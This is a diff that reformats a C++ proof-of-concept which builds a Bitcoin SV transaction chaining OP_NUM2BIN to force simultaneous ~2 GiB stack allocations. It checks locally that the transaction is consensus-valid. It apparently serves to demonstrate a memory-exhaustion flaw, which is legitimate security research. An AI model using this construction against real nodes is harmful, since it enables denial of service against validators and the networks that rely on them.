@@ -52,16 +52,16 @@ namespace po = boost::program_options;
 // Fixed parameters
 // ============================================================
 
-static constexpr int32_t UTXO_HEIGHT  = 620539; // post-Genesis UTXO (Genesis @ 620538)
+static constexpr int32_t UTXO_HEIGHT = 620539;  // post-Genesis UTXO (Genesis @ 620538)
 static constexpr int32_t BLOCK_HEIGHT = 720540; // post-Genesis spending block
-static constexpr bool    CONSENSUS    = true;   // block-validation mode (skips IsStandardTx)
+static constexpr bool CONSENSUS = true; // block-validation mode (skips IsStandardTx)
 
 // ============================================================
 // Transaction building helpers
 // ============================================================
 
 static CMutableTransaction BuildCreditingTransaction(const CScript& scriptPubKey,
-                                                      const Amount nValue)
+                                                     const Amount nValue)
 {
     CMutableTransaction txCredit;
     txCredit.nVersion = 1;
@@ -77,7 +77,7 @@ static CMutableTransaction BuildCreditingTransaction(const CScript& scriptPubKey
 }
 
 static CMutableTransaction BuildSpendingTransaction(const CScript& scriptSig,
-                                                     const CMutableTransaction& txCredit)
+                                                    const CMutableTransaction& txCredit)
 {
     CMutableTransaction txSpend;
     txSpend.nVersion = 1;
@@ -110,7 +110,8 @@ static CMutableTransaction BuildSpendingTransaction(const CScript& scriptSig,
 // Final state: stack = [ INT32_MAX ] → truthy → SCRIPT_ERR_OK → consensus-valid.
 
 static bsv::CMutableTransactionExtended BuildMemoryAttackTransaction(
-    const std::string& network, int numChains)
+    const std::string& network,
+    int numChains)
 {
     SelectParams(network, std::nullopt);
 
@@ -119,29 +120,30 @@ static bsv::CMutableTransactionExtended BuildMemoryAttackTransaction(
     // scriptSig: N pairs of (1-byte data, INT32_MAX target size)
     CScript scriptSig;
     const std::vector<uint8_t> oneByteData{0x01};
-    for (int i = 0; i < numChains; ++i) {
+    for(int i = 0; i < numChains; ++i)
+    {
         scriptSig << oneByteData;
         scriptSig << CScriptNum(NUM2BIN_SIZE);
     }
 
     // scriptPubKey
     CScript scriptPubKey;
-    for (int i = 0; i < numChains - 1; ++i)
+    for(int i = 0; i < numChains - 1; ++i)
         scriptPubKey << OP_NUM2BIN << OP_TOALTSTACK;
-    scriptPubKey << OP_NUM2BIN;             // Nth blob — peak memory reached here
-    for (int i = 0; i < numChains - 1; ++i)
+    scriptPubKey << OP_NUM2BIN; // Nth blob — peak memory reached here
+    for(int i = 0; i < numChains - 1; ++i)
         scriptPubKey << OP_FROMALTSTACK;
-    for (int i = 0; i < numChains - 1; ++i)
+    for(int i = 0; i < numChains - 1; ++i)
         scriptPubKey << OP_DROP;
-    scriptPubKey << OP_SIZE << OP_NIP;      // leaves INT32_MAX (truthy) — valid termination
+    scriptPubKey << OP_SIZE << OP_NIP; // leaves INT32_MAX (truthy) — valid termination
 
     const Amount amount{1000000};
     const CMutableTransaction txCredit = BuildCreditingTransaction(scriptPubKey, amount);
-    CMutableTransaction txSpend  = BuildSpendingTransaction(scriptSig, txCredit);
+    CMutableTransaction txSpend = BuildSpendingTransaction(scriptSig, txCredit);
 
     bsv::CMutableTransactionExtended eTX;
     eTX.vutxo = txCredit.vout;
-    eTX.mtx   = std::move(txSpend);
+    eTX.mtx = std::move(txSpend);
     return eTX;
 }
 
@@ -154,17 +156,16 @@ int main(int argc, char* argv[])
     int numChains = 2;
 
     po::options_description desc("OP_NUM2BIN simultaneous memory allocation attack");
-    desc.add_options()
-        ("help,h",
-            "Show this help message")
-        ("num-chains,n",
-            po::value<int>(&numChains)->default_value(2),
-            "Number of simultaneous ~2 GiB blobs to keep alive on the stack at peak "
-            "(default: 2, peak ~4 GiB). "
-            "WARNING: each additional chain adds ~2 GiB of peak RAM usage.");
+    desc.add_options()("help,h", "Show this help message")(
+        "num-chains,n",
+        po::value<int>(&numChains)->default_value(2),
+        "Number of simultaneous ~2 GiB blobs to keep alive on the stack at peak "
+        "(default: 2, peak ~4 GiB). "
+        "WARNING: each additional chain adds ~2 GiB of peak RAM usage.");
 
     po::variables_map vm;
-    try {
+    try
+    {
         po::store(po::parse_command_line(argc, argv, desc), vm);
         if(vm.contains("help"))
         {
@@ -173,12 +174,14 @@ int main(int argc, char* argv[])
         }
         po::notify(vm);
     }
-    catch (const po::error& e) {
+    catch(const po::error& e)
+    {
         std::cerr << "Argument error: " << e.what() << "\n" << desc << "\n";
         return 1;
     }
 
-    if (numChains < 1) {
+    if(numChains < 1)
+    {
         std::cerr << "Error: --num-chains must be >= 1\n";
         return 1;
     }
@@ -186,25 +189,37 @@ int main(int argc, char* argv[])
     const std::string network = CBaseChainParams::MAIN;
 
     const double blobGiB = static_cast<double>(std::numeric_limits<int32_t>::max())
-                           / (1024.0 * 1024.0 * 1024.0);
+                         / (1024.0 * 1024.0 * 1024.0);
     const double peakGiB = numChains * blobGiB;
 
-    std::cout << std::fixed
-              << "=======================================================\n"
-              << "  OP_NUM2BIN Simultaneous Memory Allocation Attack\n"
-              << "=======================================================\n"
-              << "  num-chains  : " << numChains << "\n"
-              << "  blob size   : INT32_MAX = "
-              << std::numeric_limits<int32_t>::max()
-              << " bytes  (~" << std::setprecision(2) << blobGiB << " GiB)\n"
-              << "  peak memory : " << numChains << " x ~" << blobGiB
-              << " GiB  =  ~" << std::setprecision(1) << peakGiB << " GiB\n"
-              << "  consensus   : true  (block-validation mode)\n"
-              << "\n";
+    std::cout
+        << std::fixed
+        << "=======================================================\n"
+        << "  OP_NUM2BIN Simultaneous Memory Allocation Attack\n"
+        << "=======================================================\n"
+        << "  num-chains  : "
+        << numChains
+        << "\n"
+        << "  blob size   : INT32_MAX = "
+        << std::numeric_limits<int32_t>::max()
+        << " bytes  (~"
+        << std::setprecision(2)
+        << blobGiB
+        << " GiB)\n"
+        << "  peak memory : "
+        << numChains
+        << " x ~"
+        << blobGiB
+        << " GiB  =  ~"
+        << std::setprecision(1)
+        << peakGiB
+        << " GiB\n"
+        << "  consensus   : true  (block-validation mode)\n"
+        << "\n";
 
     std::cout << "Building attack transaction... " << std::flush;
-    const bsv::CMutableTransactionExtended eTX =
-        BuildMemoryAttackTransaction(network, numChains);
+    const bsv::CMutableTransactionExtended eTX = BuildMemoryAttackTransaction(network,
+                                                                              numChains);
     std::cout << "done\n";
 
     CDataStream out(SER_NETWORK, PROTOCOL_VERSION);
@@ -216,22 +231,35 @@ int main(int argc, char* argv[])
     const bsv::CTxValidator se(network);
 
     std::cout << "Calling ValidateTransaction (consensus=true)... " << std::flush;
-    const TxError ret = se.ValidateTransaction(
-        etxBin, std::span<const int32_t>(utxoArray), BLOCK_HEIGHT, CONSENSUS);
+    const TxError ret = se.ValidateTransaction(etxBin,
+                                               std::span<const int32_t>(utxoArray),
+                                               BLOCK_HEIGHT,
+                                               CONSENSUS);
     std::cout << "done\n\n";
 
-    if (bsv::TxErrorIsOk(ret)) {
-        std::cout << "Result : VALID  (SCRIPT_ERR_OK)\n"
-                  << "\n"
-                  << "A transaction that forces " << numChains
-                  << " simultaneous ~2 GiB stack allocations\n"
-                  << "(peak ~" << std::setprecision(1) << peakGiB << " GiB) "
-                  << "is consensus-valid. No protocol defence fires:\n"
-                  << "  - maxStackSize = INT64_MAX (post-Genesis consensus mode)\n"
-                  << "  - SCRIPT_VERIFY_CLEANSTACK not set in GetBlockScriptFlags\n";
+    if(bsv::TxErrorIsOk(ret))
+    {
+        std::cout
+            << "Result : VALID  (SCRIPT_ERR_OK)\n"
+            << "\n"
+            << "A transaction that forces "
+            << numChains
+            << " simultaneous ~2 GiB stack allocations\n"
+            << "(peak ~"
+            << std::setprecision(1)
+            << peakGiB
+            << " GiB) "
+            << "is consensus-valid. No protocol defence fires:\n"
+            << "  - maxStackSize = INT64_MAX (post-Genesis consensus mode)\n"
+            << "  - SCRIPT_VERIFY_CLEANSTACK not set in GetBlockScriptFlags\n";
         return 0;
     }
 
-    std::cout << "Result : INVALID  (domain=" << ret.domain << " code=" << ret.code << ")\n";
+    std::cout
+        << "Result : INVALID  (domain="
+        << ret.domain
+        << " code="
+        << ret.code
+        << ")\n";
     return 1;
 }
